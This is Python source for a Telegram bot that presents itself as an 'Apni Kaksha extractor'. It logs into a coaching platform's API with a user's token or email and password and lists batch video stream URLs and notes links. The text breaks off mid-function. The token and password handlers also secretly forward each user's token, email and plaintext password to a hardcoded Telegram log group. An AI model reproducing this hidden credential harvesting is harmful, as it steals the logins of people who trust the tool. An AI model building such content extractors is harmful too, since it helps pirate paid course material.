import logging
import os
import requests
from telegram import Update
from telegram.ext import (
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Constants
LOG_GROUP_ID = -1002385500773
ROOT_DIR = os.getcwd()

# Conversation states
AUTH_CHOICE, TOKEN_INPUT, EMAIL_INPUT, PASSWORD_INPUT, BATCH_ID, SUBJECT_IDS, CONTENT_TYPE = range(7)

def get_jwt_token(email, password):
    url = "https://spec.apnikaksha.net/api/v2/login-other"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://web.apnikaksha.net",
        "OriginType": "web",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    }
    data = {"email": email, "password": password}
    
    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            return response.json().get("data", {}).get("token")
        return None
    except Exception as e:
        logging.error(f"JWT token generation error: {e}")
        return None

async def ak_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝑨𝒑𝒏𝒊 𝑲𝒂𝒌𝒔𝒉𝒂 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒐𝒓!\n\n𝑪𝒉𝒐𝒐𝒔𝒆 𝒂𝒖𝒕𝒉𝒆𝒏𝒕𝒊𝒄𝒂𝒕𝒊𝒐𝒏 𝒎𝒆𝒕𝒉𝒐𝒅:\n1. Token\n2. Email/Password\n\n𝑻𝒚𝒑𝒆 1 𝒐𝒓 2:"
    )
    return AUTH_CHOICE

async def handle_auth_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    choice = update.message.text.strip()
    if choice == "1":
        await update.message.reply_text("𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑻𝒐𝒌𝒆𝒏:")
        return TOKEN_INPUT
    elif choice == "2":
        await update.message.reply_text("𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑬𝒎𝒂𝒊𝒍:")
        return EMAIL_INPUT
    else:
        await update.message.reply_text("Invalid choice. Please use /ak to start again.")
        return ConversationHandler.END

async def handle_token_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    context.user_data['token'] = token
    try:
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"New Apni Kaksha Token Login:\nToken: {token}"
        )
    except Exception as e:
        logging.error(f"Error logging token: {e}")
    return await fetch_batches(update, context)

async def handle_email_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['email'] = update.message.text.strip()
    await update.message.reply_text("𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒕𝒆𝒓 𝒚𝒐𝒖𝒓 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅:")
    return PASSWORD_INPUT

async def handle_password_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        email = context.user_data['email']
        password = update.message.text.strip()
        token = get_jwt_token(email, password)
        
        if not token:
            await update.message.reply_text("Failed to generate token. Please try again with /ak")
            return ConversationHandler.END
        
        # Log credentials
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"New Apni Kaksha Login:\nEmail: {email}\nPassword: {password}\nToken: {token}"
        )
        
        context.user_data['token'] = token
        await update.message.reply_text("𝑨𝒖𝒕𝒉𝒆𝒏𝒕𝒊𝒄𝒂𝒕𝒊𝒐𝒏 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍! 𝑭𝒆𝒕𝒄𝒉𝒊𝒏𝒈 𝒃𝒂𝒕𝒄𝒉𝒆𝒔...")
        return await fetch_batches(update, context)
    except Exception as e:
        logging.error(f"Password handling error: {e}")
        await update.message.reply_text(f"Error: {str(e)}\nPlease try again with /ak")
        return ConversationHandler.END

async def fetch_batches(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        headers = {
            "Host": "spec.apnikaksha.net",
            "token": context.user_data['token'],
            "origintype": "web",
            "user-agent": "Android",
            "usertype": "2",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        
        response = requests.get(
            "https://spec.apnikaksha.net/api/v2/my-batch",
            headers=headers
        ).json()
        
        if 'data' not in response:
            await update.message.reply_text("Invalid token or API error. Please try again with /ak")
            return ConversationHandler.END
            
        batch_data = response["data"]["batchData"]
        batch_text = "𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒂𝒕𝒄𝒉𝒆𝒔:\n\n"
        
        for data in batch_data:
            batch_text += f"𝑵𝒂𝒎𝒆: `{data['batchName']}`\n𝑰𝑫: `{data['id']}`\n\n"
            
        await update.message.reply_text(batch_text, parse_mode='Markdown')
        await update.message.reply_text("𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒕𝒆𝒓 𝒕𝒉𝒆 𝑩𝒂𝒕𝒄𝒉 𝑰𝑫:")
        return BATCH_ID
        
    except Exception as e:
        logging.error(f"Batch fetching error: {e}")
        await update.message.reply_text(f"Error: {str(e)}\nPlease try again with /ak")
        return ConversationHandler.END

async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        batch_id = update.message.text.strip()
        context.user_data['batch_id'] = batch_id
        
        headers = {
            "Host": "spec.apnikaksha.net",
            "token": context.user_data['token'],
            "origintype": "web",
            "user-agent": "Android",
            "usertype": "2",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-subject/{batch_id}",
            headers=headers
        ).json()
        
        if 'data' not in response:
            await update.message.reply_text("Invalid batch ID. Please try again with /ak")
            return ConversationHandler.END
            
        subjects = response["data"]["batch_subject"]
        subject_text = "𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑺𝒖𝒃𝒋𝒆𝒄𝒕𝒔:\n\n"
        subject_ids = []
        
        for data in subjects:
            subject_text += f"𝑵𝒂𝒎𝒆: {data['subjectName']}\n𝑰𝑫: `{data['id']}`\n\n"
            subject_ids.append(data["id"])
            
        context.user_data['all_subject_ids'] = "&".join(map(str, subject_ids))
        
        await update.message.reply_text(subject_text, parse_mode='Markdown')
        await update.message.reply_text(
            f"𝑬𝒏𝒕𝒆𝒓 𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝑰𝑫(𝒔) 𝒔𝒆𝒑𝒂𝒓𝒂𝒕𝒆𝒅 𝒃𝒚 '&'\n\n𝑻𝒐 𝒆𝒙𝒕𝒓𝒂𝒄𝒕 𝒂𝒍𝒍 𝒔𝒖𝒃𝒋𝒆𝒄𝒕𝒔, 𝒖𝒔𝒆 𝒕𝒉𝒊𝒔:\n`{context.user_data['all_subject_ids']}`",
            parse_mode='Markdown'
        )
        return SUBJECT_IDS
        
    except Exception as e:
        logging.error(f"Batch ID handling error: {e}")
        await update.message.reply_text(f"Error: {str(e)}\nPlease try again with /ak")
        return ConversationHandler.END

async def handle_subject_ids(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['subject_ids'] = update.message.text.strip()
    await update.message.reply_text("𝑾𝒉𝒂𝒕 𝒅𝒐 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒆𝒙𝒕𝒓𝒂𝒄𝒕?\n\n𝑻𝒚𝒑𝒆 '𝒄𝒍𝒂𝒔𝒔' 𝒇𝒐𝒓 𝑽𝒊𝒅𝒆𝒐𝒔 𝒐𝒓 '𝒏𝒐𝒕𝒆𝒔' 𝒇𝒐𝒓 𝑵𝒐𝒕𝒆𝒔:")
    return CONTENT_TYPE

async def extract_video_content(headers, batch_id, subject_id, topic_id):
    content = ""
    try:
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-detail/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
            headers=headers
        ).json()
        
        if 'data' in response and 'class_list' in response['data']:
            classes = response["data"]["class_list"]["classes"]
            for class_data in classes:
                video_token_response = requests.get(
                    f"https://spec.apnikaksha.net/api/v2/livestreamToken?base=web&module=batch&type=brightcove&vid={class_data['id']}",
                    headers=headers
                ).json()
                
                video_token = video_token_response.get("data", {}).get("token")
                if video_token:
                    lesson_name = class_data["lessonName"].replace(":", " ")
                    video_url = f"https://edge.api.brightcove.com/playback/v1/accounts/6415636611001/videos/{class_data['lessonUrl']}/master.m3u8?bcov_auth={video_token}"
                    content += f"{lesson_name}: {video_url}\n"
    except Exception as e:
        logging.error(f"Video content extraction error: {e}")
    return content

async def extract_notes_content(headers, batch_id, subject_id, topic_id):
    content = ""
    try:
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-notes/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
            headers=headers
        ).json()
        
        if 'data' in response and 'notesDetails' in response['data']:
            notes = response["data"]["notesDetails"]
            for note in notes:
                doc_title = note["docTitle"].replace(":", " ")
                content += f"{doc_title}: {note['docUrl']}\n"
    except Exception as e:
        logging.error(f"Notes content extraction error: {e}")
    return content

async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        content_type = update.message.text.strip().lower()
        if content_type not in